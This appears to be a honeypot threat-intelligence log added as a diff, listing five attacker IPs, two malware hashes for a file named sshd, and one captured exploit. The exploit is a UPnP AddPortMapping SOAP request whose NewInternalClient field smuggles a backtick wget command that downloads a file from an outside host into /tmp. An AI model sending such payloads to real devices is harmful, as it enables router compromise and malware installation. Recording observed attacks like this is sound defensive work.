@@ -1,0 +1,33 @@
+Top 5 IPs for 10-08-2024 :
+
+64.227.146.61
+165.227.154.184
+36.103.229.250
+43.163.0.67
+174.138.26.8
+
+
+Malware Observed:
+
+File Name : sshd
+130b71d63afd3eb728ff89a80ab09a23c9f4e6c0c17854c045f196925f4ac8e5
+https://www.virustotal.com/gui/file/130b71d63afd3eb728ff89a80ab09a23c9f4e6c0c17854c045f196925f4ac8e5
+
+
+71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+
+
+Commands/exploits observed:
+
+
+POST /picdesc.xml HTTP/1.1
+Host: 127.0.0.1:52869
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`wget http://45.148.120.244/r -O /tmp/r;`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
